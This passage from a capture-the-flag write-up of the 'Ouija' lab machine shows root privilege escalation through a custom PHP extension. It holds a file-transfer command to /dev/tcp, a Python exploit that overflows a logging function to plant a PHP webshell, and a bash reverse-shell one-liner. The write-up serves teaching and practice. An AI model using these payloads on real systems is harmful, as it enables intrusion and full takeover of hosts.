tcp        0      0 127.0.0.1:9999          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::3000                 :::*                    LISTEN      853/js
```

But there is also the port 9999, which is a php server running by root in the WorkingDirectory /development/server-management_system_id_0:

```bash
leila@ouija:~$ cd /etc/systemd/
leila@ouija:/etc/systemd$ grep -r :9999 
system/start__pph.service:ExecStart=/usr/bin/php -S 127.0.0.1:9999
leila@ouija:/etc/systemd$ cat system/start__pph.service 
[Unit]
Description=VERTICA

[Service]
User=root
WorkingDirectory=/development/server-management_system_id_0
ExecStart=/usr/bin/php -S 127.0.0.1:9999
Restart=always

[Install]
WantedBy=multi-user.target
```

Let's take a look to this directory:

```bash
leila@ouija:/etc/systemd$ cd /development/server-management_system_id_0/
leila@ouija:/development/server-management_system_id_0$ ls
core  img  index.php  main.js  README.md  style.css
```

In the index.php, it passes the "username" and "password" form arguments to the function say_lverifier:

```php
<?php
	if(isset($_POST['username']) && isset($_POST['password'])){
//		system("echo ".$_POST['username']." > /tmp/LOG");
		if(say_lverifier($_POST['username'], $_POST['password'])){
			session_start();
			$_SESSION['username'] = $_POST['username'];
			$_SESSION['IS_USER_'] = "yes";
			$_SESSION['__HASH__'] = md5($_POST['username'] . "::" . $_POST['password']);
			header('Location: /core/index.php');
		}else{
			echo "<script>alert('invalid credentials')</alert>";
		}
	}
?>
```

Since this is the only interesting place where our input is passed, let's inspect it.
This function is not declared in any php file but it's a custom plugin for php that is loaded in php.ini:

```bash
leila@ouija:/development/server-management_system_id_0$ cat /etc/php/8.2/cli/php.ini | grep lverifier
extension=lverifier.so
leila@ouija:/development/server-management_system_id_0$ cat /etc/php/8.2/apache2/php.ini | grep lverifier
extention=lverifier.so
```

Let's search for this file:

```bash
leila@ouija:/development/server-management_system_id_0$ find / -name lverifier.so 2>/dev/null 
/usr/lib/php/20220829/lverifier.so
```

We can try to make a dynamic linked library injection, but it's not writable by leila obviusly:

```bash
leila@ouija:/development/server-management_system_id_0$ ls -l /usr/lib/php/20220829/lverifier.so
-rwxr-xr-x 1 root root 43472 Jun 25  2023 /usr/lib/php/20220829/lverifier.so
```

Now let's transfer it to our machine:

#### Attacker machine

```bash
❯ nc -lvnp 443 > lverifier.so
listening on [any] 443 ...
```

#### Victim machine

```bash
leila@ouija:/development/server-management_system_id_0$ cat /usr/lib/php/20220829/lverifier.so > /dev/tcp/<YOUR IP>/443
```

Searching in google how to load a .so file in php, we can see that we can do it with dl() function:

![How to load .so file in PHP](/assets/images/Ouija/loading_so_file_php_info.png)

Trying it, we receive a error message saying that isn't enabled, so let's change it in php.ini:

```bash
❯ php -a
Interactive shell

php > dl("lverifier.so");
PHP Warning:  dl(): Dynamically loaded extensions aren't enabled in php shell code on line 1
```

![Enabling dl](/assets/images/Ouija/enabling_dl.png)

Now we can see that is trying to load it from /usr/lib/php/20220829/ so let's move it there, add execution privileges and call it without .so:

```bash
❯ sudo mv lverifier.so /usr/lib/php/20220829/.
❯ sudo chmod +x /usr/lib/php/20220829/lverifier.so
```

```bash
❯ php -a
Interactive shell

php > dl("lverifier");
php >
```

Now it has loaded successfully, let's try to call the function say_lverifier:

```bash
❯ php -a
Interactive shell

php > dl("lverifier");
php > say_lverifier("test", "test");
error in reading shadow file
```

It says that it can't read the shadow file, let's try as root:

```bash
❯ sudo php -a
php > if (say_lverifier("gabri", 'my_incorrect_password')) { echo "Correct"; } else { echo "Incorrect"; };
Incorrect
php > if (say_lverifier("root", 'my_correct_password')) { echo "Correct"; } else { echo "Incorrect"; };
Correct
```

It verifies the password from the /etc/shadow to see if it's correct. Now let's add the right configuration to debug with gdb:.

```bash
# Add the extension
❯ pushd /etc/php/8.2/mods-available
❯ sudo vi lverifier.so
    extension=lverifier.so
```

```bash
# Install gdb and gef
❯ sudo apt install gdb
❯ sudo bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
```

Having a look to the binary with ghidra, we can see that it saves into a logfile /var/log/lverifier.log some data that is passed to the event_recorder function that we input:

![800 maximum length](/assets/images/Ouija/800_length.png)

![It writes in a log file](/assets/images/Ouija/writing_log_file.png)

So we can try to make a integer overflow (because in the event_recorder function it stablishes a buffer) to create a webshell in the webroot directory(/development/server-management_system_id_0/) and gain access as root.
For that, first we have to see the offset with pattern create:

```bash
❯ sudo gdb php
GNU gdb (Debian 13.2-1) 13.2
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
88 commands loaded and 5 functions added for GDB 13.2 in 0.00ms using Python engine 3.11
Reading symbols from php...
(No debugging symbols found in php)
```
```bash
gef➤  run -a
Starting program: /usr/bin/php -a
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Interactive shell

php > (ctrl+c)
gef➤  pattern create 65535
[+] Generating a pattern of 65535 bytes (n=8)
alpzaaaaalqbaaaaalqcaaaaalqdaaaaalqeaaaaalqfaaaaalqgaaaaalqhaaaaalqiaaaaalqjaaaaalqkaaaaalqlaaaaalqmaaaaalqnaaaaalqoaaaaalqpaaaaalqqaaaaalqraaaaalqsaaaaalqtaaaaalquaaaaalqvaaaaalqwaaaaalqxaaaaalqyaaaaalqzaaaaalrbaaaaalrcaaaaalrdaaaaalreaaaaalrfaaaaalrgaaaaalrhaaaaalriaaaaalrjaaaaalrkaaaaalrlaaaaalrmaaaaalrnaaaaalroaaaaalrpaaaaalrqaaaaalrraaaaalrsaaaaalrtaaaaalruaaaaalrvaaaaalrwaaaaalrxaaaaalryaaaaalrzaaaaalsbaaaaalscaaaaalsdaaaaalseaaaaalsfaaaaalsgaaaaalshaaaaalsiaaaaalsjaaaaalskaaaaalslaaaaalsmaaaaalsnaaaaalsoaaaaalspaaaaalsqaaaaalsraaaaalssaaaaalstaaaaalsuaaaaalsvaaaaalswaaaaalsxaaaaalsyaaaaalszaaaaaltbaaaaaltcaaaaaltdaaaaalteaaaaaltfaaaaaltgaaaaalthaaaaaltiaaaaaltjaaaaaltkaaaaaltlaaaaaltmaaaaaltnaaaaaltoaaaaaltpaaaaaltqaaaaaltraaaaaltsaaaaalttaaaaaltuaaaaaltvaaaaaltwaaaaaltxaaaaaltyaaaaaltzaaaaalubaaaaalucaaaaaludaaaaalueaaaaalufaaaaalugaaaaaluhaaaaaluiaaaaalujaaaaalukaaaaalulaaaaalumaaaaalunaaaaaluoaaaaalupaaaaaluqaaaaaluraaaaalusaaaaalutaaaaaluuaaaaaluvaaaaaluwaaaaaluxaaaaaluyaaaaaluzaaaaalvbaaaaalvcaaaaalvdaaaaalveaaaaalvfaaaaalvgaaaaalvhaaaaalviaaaaalvjaaaaalvkaaaaalvlaaaaalvmaaaaalvnaaaaalvoaaaaalvpaaaaalvqaaaaalvraaaaalvsaaaaalvtaaaaalvuaaaaalvvaaaaalvwaaaaalvxaaaaalvyaaaaalvzaaaaalwbaaaaalwcaaaaalwdaaaaalweaaaaalwfaaaaalwgaaaaalwhaaaaalwiaaaaalwjaaaaalwkaaaaalwlaaaaalwmaaaaalwnaaaaalwoaaaaalwpaaaaalwqaaaaalwraaaaalwsaaaaalwtaaaaalwuaaaaalwvaaaaalwwaaaaalwxaaaaalwyaaaaalwzaaaaalxbaaaaalxcaaaaalxdaaaaalxeaaaaalxfaaaaalxgaaaaalxhaaaaalxiaaaaalxjaaaaalxkaaaaalxlaaaaalxmaaaaalxnaaaaalxoaaaaalxpaaaaalxqaaaaalxraaaaalxsaaaaalxtaaaaalxuaaaaalxvaaaaalxwaaaaalxxaaaaalxyaaaaalxzaaaaalybaaaaalycaaaaalydaaaaalyeaaaaalyfaaaaalygaaaaalyhaaaaalyiaaaaalyjaaaaalykaaaaalylaaaaalymaaaaalynaaaaalyoaaaaalypaaaaalyqaaaaalyraaaaalysaaaaalytaaaaalyuaaaaalyvaaaaalywaaaaalyxaaaaalyyaaaaalyzaaaaalzbaaaaalzcaaaaalzdaaaaalzeaaaaalzfaaaaalzgaaaaalzhaaaaalziaaaaalzjaaaaalzkaaaaalzlaaaaalzmaaaaalznaaaaalzoaaaaalzpaaaaalzqaaaaalzraaaaalzsaaaaalztaaaaalzuaaaaalzvaaaaalzwaaaaalzxaaaaalzyaaaaalzzaaaaamabaaaaamacaaaaamadaaaaamaeaaaaamafaaaaamagaaaaamahaaaaamaiaaaaamajaaaaamakaaaaamalaaaaamamaaaaamanaaaaamaoaaaaamapaaaaamaqaaaaamaraaaaamasaaaaamataaaaamauaaaaamavaaaaamawaaaaamaxaaaaamayaaaaamazaaaaambbaaaaambcaaaaambdaaaaambeaaaaambfaaaaambgaaaaambhaaaaambiaaaaambjaaaaambkaaaaamblaaaaambmaaaaambnaaaaamboaaaaambpaaaaambqaaaaambraaaaambsaaaaambtaaaaambuaaaaambvaaaaambwaaaaambxaaaaambyaaaaambzaaaaamcbaaaaamccaaaaamcdaaaaamceaaaaamcfaaaaamcgaaaaamchaaaaamciaaaaamcjaaaaamckaaaaamclaaaaamcmaaaaamcnaaaaamcoaaaaamcpaaaaamcqaaaaamcraaaaamcsaaaaamctaaaaamcuaaaaamcvaaaaamcwaaaaamcxaaaaamcyaaaaamczaaaaamdbaaaaamdcaaaaamddaaaaamdeaaaaamdfaaaaamdgaaaaamdhaaaaamdiaaaaamdjaaaaamdkaaaaamdlaaaaamdmaaaaamdnaaaaamdoaaaaamdpaaaaamdqaaaaamdraaaaamdsaaaaamdtaaaaamduaaaaamdvaaaaamdwaaaaamdxaaaaamdyaaaaamdzaaaaamebaaaaamecaaaaamedaaaaameeaaaaamefaaaaamegaaaaamehaaaaameiaaaaamejaaaaamekaaaaamelaaaaamemaaaaamenaaaaameoaaaaamepaaaaameqaaaaameraaaaamesaaaaametaaaaameuaaaaamevaaaaamewaaaaamexaaaaameyaaaaamezaaaaamfbaaaaamfcaaaaamfdaaaaamfeaaaaamffaaaaamfgaaaaamfhaaaaamfiaaaaamfjaaaaamfkaaaaamflaaaaamfmaaaaamfnaaaaamfoaaaaamfpaaaaamfqaaaaamfraaaaamfsaaaaamftaaaaamfuaaaaamfvaaaaamfwaaaaamfxaaaaamfyaaaaamfzaaaaamgbaaaaamgcaaaaamgdaaaaamgeaaaaamgfaaaaamggaaaaamghaaaaamgiaaaaamgjaaaaamgkaaaaamglaaaaamgmaaaaamgnaaaaamgoaaaaamgpaaaaamgqaaaaamgraaaaamgsaaaaamgtaaaaamguaaaaamgvaaaaamgwaaaaamgxaaaaamgyaaaaamgzaaaaamhbaaaaamhcaaaaamhdaaaaamheaaaaamhfaaaaamhgaaaaamhhaaaaamhiaaaaamhjaaaaamhkaaaaamhlaaaaamhmaaaaamhnaaaaamhoaaaaamhpaaaaamhqaaaaamhraaaaamhsaaaaamhtaaaaamhuaaaaamhvaaaaamhwaaaaamhxaaaaamhyaaaaamhzaaaaamibaaaaamicaaaaamidaaaaamieaaaaamifaaaaamigaaaaamihaaaaamiiaaaaamijaaaaamikaaaaamilaaaaamimaaaaaminaaaaamioaaaaamipaaaaamiqaaaaamiraaaaamisaaaaamitaaaaamiuaaaaamivaaaaamiwaaaaamixaaaaamiyaaaaamizaaaaamjbaaaaamjcaaaaamjdaaaaamjeaaaaamjfaaaaamjgaaaaamjhaaaaamjiaaaaamjjaaaaamjkaaaaamjlaaaaamjmaaaaamjnaaaaamjoaaaaamjpaaaaamjqaaaaamjraaaaamjsaaaaamjtaaaaamjuaaaaamjvaaaaamjwaaaaamjxaaaaamjyaaaaamjzaaaaamkbaaaaamkcaaaaamkdaaaaamkeaaaaamkfaaaaamkgaaaaamkhaaaaamkiaaaaamkjaaaaamkkaaaaamklaaaaamkmaaaaamknaaaaamkoaaaaamkpaaaaamkqaaaaamkraaaaamksaaaaamktaaaaamkuaaaaamkvaaaaamkwaaaaamkxaaaaamkyaaaaamkzaaaaamlbaaaaamlcaaaaamldaaaaamleaaaaamlfaaaaamlgaaaaamlhaaaaamliaaaaamljaaaaamlkaaaaamllaaaaamlmaaaaamlnaaaaamloaaaaamlpaaaaamlqaaaaamlraaaaamlsaaaaamltaaaaamluaaaaamlvaaaaamlwaaaaamlxaaaaamlyaaaaamlzaaaaammbaaaaammcaaaaammdaaaaammeaaaaammfaaaaammgaaaaammhaaaaammiaaaaammjaaaaammkaaaaammlaaaaammmaaaaammnaaaaammoaaaaammpaaaaammqaaaaammraaaaammsaaaaammtaaaaammuaaaaammvaaaaammwaaaaammxaaaaammyaaaaammzaaaaamnbaaaaamncaaaaamndaaaaamneaaaaamnfaaaaamngaaaaamnhaaaaamniaaaaamnjaaaaamnkaaaaamnlaaaaamnmaaaaamnnaaaaamnoaaaaamnpaaaaamnqaaaaamnraaaaamnsaaaaamntaaaaamnuaaaaamnvaaaaamnwaaaaamnxaaaaamnyaaaaamnzaaaaamobaaaaamocaaaaamodaaaaamoeaaaaamofaaaaamogaaaaamohaaaaamoiaaaaamojaaaaamokaaaaamolaaaaamomaaaaamonaaaaamooaaaaamopaaaaamoqaaaaamoraaaaamosaaaaamotaaaaamouaaaaamovaaaaamowaaaaamoxaaaaamoyaaaaamozaaaaampbaaaaampcaaaaampdaaaaampeaaaaampfaaaaampgaaaaamphaaaaampiaaaaampjaaaaampkaaaaamplaaaaampmaaaaampnaaaaampoaaaaamppaaaaampqaaaaam
[...SNIP...]
[+] Saved as '$_gef0'
gef➤ b event_recorder
gef➤ run -a
Starting program: /usr/bin/php -a
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Interactive shell

php > dl('lverifier');
php > $data = "<Copied_data>";
php > say_lverifier($data, "test");

[...SNIP...]
[#0] 0x7ffff4bf23b0 → event_recorder(p=0x7fffffffc420 "caaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaad", w=0x7fffffffc490 "qaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaad")
[#1] 0x7ffff4bf29a1 → validating_userinput(username=<optimized out>, password=0x7ffff4c55378 "test")
[#2] 0x7ffff4bf2a79 → zif_say_lverifier(execute_data=<optimized out>, return_value=0x7fffffffcb00)
[#3] 0x5555558b945a → execute_ex()
[#4] 0x5555558bf675 → zend_execute()
[#5] 0x55555583d209 → zend_eval_stringl()
[#6] 0x7ffff5135027 → mov rbx, QWORD PTR [rip+0x2fba]        # 0x7ffff5137fe8
[#7] 0x555555934c95 → lea rdx, [rip+0x19d1c4]        # 0x555555ad1e60 <executor_globals>
[#8] 0x55555567c1e7 → jmp 0x55555567c0db
[#9] 0x7ffff74456ca → __libc_start_call_main(main=0x55555567bef0, argc=0x2, argv=0x7fffffffe468)
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern search caaaaaaadaaaaaaaeaaaaaaaf
[+] Searching for '66616161616161616561616161616161646161616161616163'/'63616161616161616461616161616161656161616161616166' with period=8
[+] Found at offset 16 (big-endian search) 
gef➤  pattern search qaaaaaaar
[+] Searching for '726161616161616171'/'716161616161616172' with period=8
[+] Found at offset 128 (big-endian search) 
gef➤  
```

We can see that the offset for the log file name is 16 and the offset for the content to write is 128, so i will create this python script to make this work and write a php webshell to the webroot:

```python
#!/usr/bin/python3
import requests

buf = "A"*16
log_file_name = "/development/server-management_system_id_0/cmd.php\n"
buf += "/"*(128 - len(buf) - len(log_file_name))
buf += log_file_name
file_content = '<?php system($_REQUEST["cmd"]); ?>'
buf += file_content
buf += "D"*(65535 - len(buf))

pwn_data = {'username': buf, 'password': 'test'}
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

r = requests.post("http://localhost:9999", data=pwn_data, headers=headers)
```

If we execute it we can see that the cmd.php is successfully created in /development/server-management_system_id_0:

```bash
leila@ouija:/tmp$ python3 exploit.py 
leila@ouija:/tmp$ cat /development/server-management_system_id_0/cmd.php 
<?php system($_REQUEST["cmd"]); ?>DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
```

Now i will gain access with a reverse shell:
### Attacker

```bash
❯ nc -lvnp 443
listening on [any] 443 ...
```

### Victim

```bash
leila@ouija:/tmp$ curl 'http://localhost:9999/cmd.php?cmd=bash+-c+"bash+-i+>%26+/dev/tcp/YOUR_IP/443+0>%261"'
```

Now we have access as root, I will stabilize the tty just for doing ctrl+c and having fully interactive shell:

```bash
connect to [10.10.14.61] from (UNKNOWN) [10.10.11.244] 56098
bash: cannot set terminal process group (854): Inappropriate ioctl for device
bash: no job control in this shell
root@ouija:/development/server-management_system_id_0# whoami
whoami
root
root@ouija:/development/server-management_system_id_0# script /dev/null -c bash
<er-management_system_id_0# script /dev/null -c bash   
Script started, output log file is '/dev/null'.
root@ouija:/development/server-management_system_id_0# ^Z
[1]  + 174874 suspended  nc -lvnp 443
❯ stty raw -echo; fg
[1]  + 174874 continued  nc -lvnp 443
                                     reset xterm

root@ouija:/development/server-management_system_id_0# export TERM=xterm
root@ouija:/development/server-management_system_id_0# export SHELL=bash
```

And we can see root.txt:

```bash
root@ouija:/development/server-management_system_id_0# cd /root/
root@ouija:~# cat root.txt 
7f****************************90
```

That's this insane machine, hope you liked it.
